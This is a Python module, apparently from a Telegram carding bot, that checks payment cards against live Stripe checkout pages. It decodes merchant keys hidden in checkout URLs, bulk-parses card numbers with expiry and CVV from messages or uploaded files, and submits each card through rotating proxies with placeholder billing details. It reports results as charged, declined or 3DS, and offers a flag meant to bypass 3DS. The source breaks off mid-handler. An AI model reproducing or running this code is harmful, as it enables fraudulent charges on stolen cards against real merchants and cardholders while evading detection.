import time
import re
import aiohttp
import base64
import asyncio
import json
import os
from urllib.parse import unquote
from aiogram import Router
from aiogram.types import Message
from aiogram.filters import Command
from aiogram.enums import ParseMode

router = Router()

ALLOWED_GROUP = 0
OWNER_ID = 5911009164
PROXY_FILE = "proxies.json"

HEADERS = {
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://checkout.stripe.com",
    "referer": "https://checkout.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

_session = None

def load_proxies() -> dict:
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_proxies(data: dict):
    with open(PROXY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def parse_proxy_format(proxy_str: str) -> dict:
    proxy_str = proxy_str.strip()
    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
    
    try:
        if '@' in proxy_str:
            if proxy_str.count('@') == 1:
                auth_part, host_part = proxy_str.rsplit('@', 1)
                if ':' in auth_part:
                    result["user"], result["password"] = auth_part.split(':', 1)
                if ':' in host_part:
                    result["host"], port_str = host_part.rsplit(':', 1)
                    result["port"] = int(port_str)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
                result["user"] = parts[2]
                result["password"] = parts[3]
            elif len(parts) == 2:
                result["host"] = parts[0]
                result["port"] = int(parts[1])
    except:
        pass
    
    return result

def get_proxy_url(proxy_str: str) -> str:
    parsed = parse_proxy_format(proxy_str)
    if parsed["host"] and parsed["port"]:
        if parsed["user"] and parsed["password"]:
            return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
        else:
            return f"http://{parsed['host']}:{parsed['port']}"
    return None

def get_user_proxies(user_id: int) -> list:
    proxies = load_proxies()
    user_data = proxies.get(str(user_id), [])
    if isinstance(user_data, str):
        return [user_data] if user_data else []
    return user_data if isinstance(user_data, list) else []

def add_user_proxy(user_id: int, proxy: str):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key not in proxies:
        proxies[user_key] = []
    elif isinstance(proxies[user_key], str):
        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
    
    if proxy not in proxies[user_key]:
        proxies[user_key].append(proxy)
    save_proxies(proxies)

def remove_user_proxy(user_id: int, proxy: str = None):
    proxies = load_proxies()
    user_key = str(user_id)
    if user_key in proxies:
        if proxy is None or proxy.lower() == "all":
            del proxies[user_key]
        else:
            if isinstance(proxies[user_key], list):
                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
                if not proxies[user_key]:
                    del proxies[user_key]
            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
                del proxies[user_key]
        save_proxies(proxies)
        return True
    return False

def get_user_proxy(user_id: int) -> str:
    user_proxies = get_user_proxies(user_id)
    if user_proxies:
        import random
        return random.choice(user_proxies)
    return None

def obfuscate_ip(ip: str) -> str:
    if not ip:
        return "N/A"
    parts = ip.split('.')
    if len(parts) == 4:
        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
    return "N/A"

async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
    result = {
        "status": "dead",
        "ip": None,
        "ip_obfuscated": None,
        "country": None,
        "city": None,
        "org": None,
        "using_proxy": False
    }
    
    proxy_url = None
    if proxy_str:
        proxy_url = get_proxy_url(proxy_str)
        result["using_proxy"] = True
    
    try:
        async with aiohttp.ClientSession() as session:
            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
            if proxy_url:
                kwargs["proxy"] = proxy_url
            
            async with session.get("http://ip-api.com/json", **kwargs) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["ip"] = data.get("query")
                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
                    result["country"] = data.get("country")
                    result["city"] = data.get("city")
                    result["org"] = data.get("isp")
    except:
        result["status"] = "dead"
    
    return result

async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
    result = {
        "proxy": proxy_str,
        "status": "dead",
        "response_time": None,
        "external_ip": None,
        "error": None
    }
    
    proxy_url = get_proxy_url(proxy_str)
    if not proxy_url:
        result["error"] = "Invalid format"
        return result
    
    try:
        start = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                elapsed = round((time.perf_counter() - start) * 1000, 2)
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "alive"
                    result["response_time"] = f"{elapsed}ms"
                    result["external_ip"] = data.get("query")
    except asyncio.TimeoutError:
        result["error"] = "Timeout"
    except Exception as e:
        result["error"] = str(e)[:30]
    
    return result

async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
    semaphore = asyncio.Semaphore(max_threads)
    
    async def check_with_semaphore(proxy):
        async with semaphore:
            return await check_proxy_alive(proxy)
    
    tasks = [check_with_semaphore(p) for p in proxies]
    return await asyncio.gather(*tasks)

async def get_session():
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=100, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=20, connect=5)
        )
    return _session

def get_currency_symbol(currency: str) -> str:
    symbols = {
        "USD": "$", "EUR": "€", "GBP": "£", "INR": "₹", "JPY": "¥",
        "CNY": "¥", "KRW": "₩", "RUB": "₽", "BRL": "R$", "CAD": "C$",
        "AUD": "A$", "MXN": "MX$", "SGD": "S$", "HKD": "HK$", "THB": "฿",
        "VND": "₫", "PHP": "₱", "IDR": "Rp", "MYR": "RM", "ZAR": "R",
        "CHF": "CHF", "SEK": "kr", "NOK": "kr", "DKK": "kr", "PLN": "zł",
        "TRY": "₺", "AED": "د.إ", "SAR": "﷼", "ILS": "₪", "TWD": "NT$"
    }
    return symbols.get(currency, "")

def check_access(msg: Message) -> bool:
    if msg.chat.id == ALLOWED_GROUP:
        return True
    if msg.chat.type == "private" and msg.from_user.id == OWNER_ID:
        return True
    return False

def extract_checkout_url(text: str) -> str:
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            return url
    return None

def decode_pk_from_url(url: str) -> dict:
    result = {"pk": None, "cs": None, "site": None}
    
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        
        if '#' not in url:
            return result
        
        hash_part = url.split('#')[1]
        hash_decoded = unquote(hash_part)
        
        try:
            decoded_bytes = base64.b64decode(hash_decoded)
            xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
            
            pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
            if pk_match:
                result["pk"] = pk_match.group(0)
            
            site_match = re.search(r'https?://[^\s\"\'\<\>]+', xored)
            if site_match:
                result["site"] = site_match.group(0)
        except:
            pass
            
    except:
        pass
    
    return result

def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards

async def get_checkout_info(url: str) -> dict:
    start = time.perf_counter()
    result = {
        "url": url,
        "pk": None,
        "cs": None,
        "merchant": None,
        "price": None,
        "currency": None,
        "product": None,
        "country": None,
        "mode": None,
        "customer_name": None,
        "customer_email": None,
        "support_email": None,
        "support_phone": None,
        "cards_accepted": None,
        "success_url": None,
        "cancel_url": None,
        "init_data": None,
        "error": None,
        "time": 0
    }
    
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")
        
        if result["pk"] and result["cs"]:
            s = await get_session()
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
            
            async with s.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                headers=HEADERS,
                data=body
            ) as r:
                init_data = await r.json()
            
            if "error" not in init_data:
                result["init_data"] = init_data
                
                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["support_email"] = acc.get("support_email")
                result["support_phone"] = acc.get("support_phone")
                result["country"] = acc.get("country")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                    if lig.get("line_items"):
                        items = lig["line_items"]
                        currency = lig.get("currency", "").upper()
                        sym = get_currency_symbol(currency)
                        product_parts = []
                        for item in items:
                            qty = item.get("quantity", 1)
                            name = item.get("name", "Product")
                            amt = item.get("amount", 0) / 100
                            interval = item.get("recurring_interval")
                            if interval:
                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
                            else:
                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
                        result["product"] = ", ".join(product_parts)
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()
                
                mode = init_data.get("mode", "")
                if mode:
                    result["mode"] = mode.upper()
                elif init_data.get("subscription"):
                    result["mode"] = "SUBSCRIPTION"
                else:
                    result["mode"] = "PAYMENT"
                
                cust = init_data.get("customer") or {}
                result["customer_name"] = cust.get("name")
                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
                
                pm_types = init_data.get("payment_method_types") or []
                if pm_types:
                    cards = [t.upper() for t in pm_types if t != "card"]
                    if "card" in pm_types:
                        cards.insert(0, "CARD")
                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
                
                result["success_url"] = init_data.get("success_url")
                result["cancel_url"] = init_data.get("cancel_url")
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
        else:
            result["error"] = "Could not decode PK/CS from URL"
            
    except Exception as e:
        result["error"] = str(e)
    
    result["time"] = round(time.perf_counter() - start, 2)
    return result

async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, bypass_3ds: bool = False, max_retries: int = 2) -> dict:
    start = time.perf_counter()
    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0
    }
    
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    print(f"\n[DEBUG] Card: {card_display}")
    
    for attempt in range(max_retries + 1):
        try:
            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
            connector = aiohttp.TCPConnector(limit=100, ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                email = init_data.get("customer_email") or "john@example.com"
                checksum = init_data.get("init_checksum", "")
                
                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
                elif inv:
                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
                else:
                    pi = init_data.get("payment_intent") or {}
                    total = subtotal = pi.get("amount", 0)
                
                cust = init_data.get("customer") or {}
                addr = cust.get("address") or {}
                name = cust.get("name") or "John Smith"
                country = addr.get("country") or "US"
                line1 = addr.get("line1") or "476 West White Mountain Blvd"
                city = addr.get("city") or "Pinetop"
                state = addr.get("state") or "AZ"
                zip_code = addr.get("postal_code") or "85929"
                
                pm_body = f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}&card[exp_year]={card['year']}&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][country]={country}&billing_details[address][line1]={line1}&billing_details[address][city]={city}&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
                
                if attempt > 0:
                    print(f"[DEBUG] Retry attempt {attempt}...")
                print(f"[DEBUG] Creating payment method...")
                
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=HEADERS, data=pm_body, proxy=proxy_url) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    err_msg = pm["error"].get("message", "Card error")
                    print(f"[DEBUG] PM Error: {err_msg[:60]}")
                    if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                        result["status"] = "NOT SUPPORTED"
                        result["response"] = "Checkout not supported"
                    else:
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                    result["time"] = round(time.perf_counter() - start, 2)
                    print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
                    return result
                
                pm_id = pm.get("id")
                if not pm_id:
                    result["status"] = "FAILED"
                    result["response"] = "No PM"
                    result["time"] = round(time.perf_counter() - start, 2)
                    return result
                
                print(f"[DEBUG] PM Response: {pm_id}")
                print(f"[DEBUG] Confirming payment... (bypass_3ds={bypass_3ds})")
                
                conf_body = f"eid=NA&payment_method={pm_id}&expected_amount={total}&last_displayed_line_item_group_details[subtotal]={subtotal}&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
                
                if bypass_3ds:
                    conf_body += "&return_url=https://checkout.stripe.com"
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", headers=HEADERS, data=conf_body, proxy=proxy_url) as r:
                    conf = await r.json()
                
                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
                
                if "error" in conf:
                    err = conf["error"]
                    dc = err.get("decline_code", "")
                    msg = err.get("message", "Failed")
                    result["status"] = "DECLINED"
                    result["response"] = f"{dc.upper()}: {msg}" if dc else msg
                    print(f"[DEBUG] Decline: {dc} - {msg}")
                else:
                    pi = conf.get("payment_intent") or {}
                    st = pi.get("status", "") or conf.get("status", "")
                    if st == "succeeded":
                        result["status"] = "CHARGED"
                        result["response"] = "Payment Successful"
                    elif st == "requires_action":
                        if bypass_3ds:
                            result["status"] = "3DS SKIP"
                            result["response"] = "3DS Cannot be bypassed"
                        else:
                            result["status"] = "3DS"
                            result["response"] = "3DS Required"
                    elif st == "requires_payment_method":
                        result["status"] = "DECLINED"
                        result["response"] = "Card Declined"
                    else:
                        result["status"] = "UNKNOWN"
                        result["response"] = st or "Unknown"
                
                result["time"] = round(time.perf_counter() - start, 2)
                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
                return result
                    
        except Exception as e:
            err_str = str(e)
            print(f"[DEBUG] ❌ Error: {err_str[:50]}")
            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                print(f"[DEBUG] Retrying in 1s...")
                await asyncio.sleep(1)
                continue
            result["status"] = "ERROR"
            result["response"] = err_str[:50]
            result["time"] = round(time.perf_counter() - start, 2)
            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
            return result
    
    return result

async def check_checkout_active(pk: str, cs: str) -> bool:
    try:
        s = await get_session()
        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/init",
            headers=HEADERS,
            data=body,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as r:
            data = await r.json()
            return "error" not in data
    except:
        return False

@router.message(Command("addproxy"))
async def addproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@proscraperbot</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    user_proxies = get_user_proxies(user_id)
    
    if len(args) < 2:
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗥𝗲𝗺𝗼𝘃𝗲 𝗔𝗹𝗹 : <code>/removeproxy all</code>\n"
            "「❃」 𝗖𝗵𝗲𝗰𝗸 : <code>/proxy check</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗙𝗼𝗿𝗺𝗮𝘁𝘀 :\n"
            "    • <code>host:port:user:pass</code>\n"
            "    • <code>user:pass@host:port</code>\n"
            "    • <code>host:port</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = args[1].strip()
    proxies_to_add = [p.strip() for p in proxy_input.split('\n') if p.strip()]
    
    if not proxies_to_add:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No valid proxies provided</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(proxies_to_add)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = await check_proxies_batch(proxies_to_add, max_threads=10)
    
    alive_proxies = []
    dead_proxies = []
    
    for r in results:
        if r["status"] == "alive":
            alive_proxies.append(r)
            add_user_proxy(user_id, r["proxy"])
        else:
            dead_proxies.append(r)
    
    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ✅</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive_proxies)}/{len(proxies_to_add)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead_proxies)}/{len(proxies_to_add)} ❌</code></blockquote>\n\n"
    
    if alive_proxies:
        response += "<blockquote>「❃」 𝗔𝗱𝗱𝗲𝗱 :\n"
        for p in alive_proxies[:5]:
            response += f"    • <code>{p['proxy']}</code> ({p['response_time']})\n"
        if len(alive_proxies) > 5:
            response += f"    • <code>... and {len(alive_proxies) - 5} more</code>\n"
        response += "</blockquote>"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@router.message(Command("removeproxy"))
async def removeproxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@proscraperbot</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2:
        await msg.answer(
            "<blockquote><code>𝗥𝗲𝗺𝗼𝘃𝗲 𝗣𝗿𝗼𝘅𝘆 🗑️</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/removeproxy proxy</code>\n"
            "「❃」 𝗔𝗹𝗹 : <code>/removeproxy all</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_input = args[1].strip()
    
    if proxy_input.lower() == "all":
        user_proxies = get_user_proxies(user_id)
        count = len(user_proxies)
        remove_user_proxy(user_id, "all")
        await msg.answer(
            "<blockquote><code>𝗔𝗹𝗹 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 : <code>{count} proxies</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if remove_user_proxy(user_id, proxy_input):
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 ✅</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗣𝗿𝗼𝘅𝘆 : <code>{proxy_input}</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
    else:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Proxy not found</code></blockquote>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("proxy"))
async def proxy_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@proscraperbot</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    args = msg.text.split(maxsplit=1)
    user_id = msg.from_user.id
    
    if len(args) < 2 or args[1].strip().lower() != "check":
        user_proxies = get_user_proxies(user_id)
        if user_proxies:
            proxy_list = "\n".join([f"    • <code>{p}</code>" for p in user_proxies[:10]])
            if len(user_proxies) > 10:
                proxy_list += f"\n    • <code>... and {len(user_proxies) - 10} more</code>"
        else:
            proxy_list = "    • <code>None</code>"
        
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿 🔒</code></blockquote>\n\n"
            f"<blockquote>「❃」 𝗬𝗼𝘂𝗿 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ({len(user_proxies)}) :\n{proxy_list}</blockquote>\n\n"
            "<blockquote>「❃」 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗹 : <code>/proxy check</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    user_proxies = get_user_proxies(user_id)
    
    if not user_proxies:
        await msg.answer(
            "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>No proxies to check</code>\n"
            "「❃」 𝗔𝗱𝗱 : <code>/addproxy proxy</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    checking_msg = await msg.answer(
        "<blockquote><code>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⏳</code></blockquote>\n\n"
        f"<blockquote>「❃」 𝗧𝗼𝘁𝗮𝗹 : <code>{len(user_proxies)}</code>\n"
        "「❃」 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 : <code>10</code></blockquote>",
        parse_mode=ParseMode.HTML
    )
    
    results = await check_proxies_batch(user_proxies, max_threads=10)
    
    alive = [r for r in results if r["status"] == "alive"]
    dead = [r for r in results if r["status"] == "dead"]
    
    response = f"<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸 𝗥𝗲𝘀𝘂𝗹𝘁𝘀 📊</code></blockquote>\n\n"
    response += f"<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 : <code>{len(alive)}/{len(user_proxies)} ✅</code>\n"
    response += f"「❃」 𝗗𝗲𝗮𝗱 : <code>{len(dead)}/{len(user_proxies)} ❌</code></blockquote>\n\n"
    
    if alive:
        response += "<blockquote>「❃」 𝗔𝗹𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in alive[:5]:
            ip_display = p['external_ip'] or 'N/A'
            response += f"    • <code>{p['proxy']}</code>\n      IP: {ip_display} | {p['response_time']}\n"
        if len(alive) > 5:
            response += f"    • <code>... and {len(alive) - 5} more</code>\n"
        response += "</blockquote>\n\n"
    
    if dead:
        response += "<blockquote>「❃」 𝗗𝗲𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 :\n"
        for p in dead[:3]:
            error = p.get('error', 'Unknown')
            response += f"    • <code>{p['proxy']}</code> ({error})\n"
        if len(dead) > 3:
            response += f"    • <code>... and {len(dead) - 3} more</code>\n"
        response += "</blockquote>"
    
    await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)

@router.message(Command("co"))
async def co_handler(msg: Message):
    if not check_access(msg):
        await msg.answer(
            "<blockquote><code>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗝𝗼𝗶𝗻 𝘁𝗼 𝘂𝘀𝗲 : <code>@proscraperbot</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    start_time = time.perf_counter()
    user_id = msg.from_user.id
    text = msg.text or ""
    lines = text.strip().split('\n')
    first_line_args = lines[0].split(maxsplit=3)
    
    if len(first_line_args) < 2:
        await msg.answer(
            "<blockquote><code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 ⚡</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗨𝘀𝗮𝗴𝗲 : <code>/co url</code>\n"
            "「❃」 𝗖𝗵𝗮𝗿𝗴𝗲 : <code>/co url cc|mm|yy|cvv</code>\n"
            "「❃」 𝗕𝘆𝗽𝗮𝘀𝘀 : <code>/co url yes/no cc|mm|yy|cvv</code>\n"
            "「❃」 𝗙𝗶𝗹𝗲 : <code>Reply to .txt with /co url</code>\n"
            "「❃」 𝗙𝗶𝗹𝗲+𝗕𝘆𝗽𝗮𝘀𝘀 : <code>Reply to .txt with /co url yes/no</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url = extract_checkout_url(first_line_args[1])
    if not url:
        url = first_line_args[1].strip()
    
    cards = []
    bypass_3ds = False
    
    if len(first_line_args) > 2:
        if first_line_args[2].lower() in ['yes', 'no']:
            bypass_3ds = first_line_args[2].lower() == 'yes'
            if len(first_line_args) > 3:
                cards = parse_cards(first_line_args[3])
        else:
            cards = parse_cards(first_line_args[2])
    
    if len(lines) > 1:
        remaining_text = '\n'.join(lines[1:])
        cards.extend(parse_cards(remaining_text))
    
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name and doc.file_name.endswith('.txt'):
            try:
                file = await msg.bot.get_file(doc.file_id)
                file_content = await msg.bot.download_file(file.file_path)
                text_content = file_content.read().decode('utf-8')
                cards = parse_cards(text_content)
            except Exception as e:
                await msg.answer(
                    "<blockquote><code>𝗘𝗿𝗿𝗼𝗿 ❌</code></blockquote>\n\n"
                    f"<blockquote>「❃」 𝗗𝗲𝘁𝗮𝗶𝗹 : <code>Failed to read file: {str(e)}</code></blockquote>",
                    parse_mode=ParseMode.HTML
                )
                return
    
    user_proxy = get_user_proxy(user_id)
    
    if not user_proxy:
        await msg.answer(
            "<blockquote><code>𝗡𝗼 𝗣𝗿𝗼𝘅𝘆 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>You must set a proxy first</code>\n"
            "「❃」 𝗔𝗰𝘁𝗶𝗼𝗻 : <code>/addproxy host:port:user:pass</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_info = await get_proxy_info(user_proxy)
    
    if proxy_info["status"] == "dead":
        await msg.answer(
            "<blockquote><code>𝗣𝗿𝗼𝘅𝘆 𝗗𝗲𝗮𝗱 ❌</code></blockquote>\n\n"
            "<blockquote>「❃」 𝗦𝘁𝗮𝘁𝘂𝘀 : <code>Your proxy is not responding</code>\n"
            "「❃」 𝗔𝗰𝘁𝗶𝗼𝗻 : <code>Check /proxy or /removeproxy</code></blockquote>",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy_display = f"LIVE ✅ | {proxy_info['ip_obfuscated']}"
    
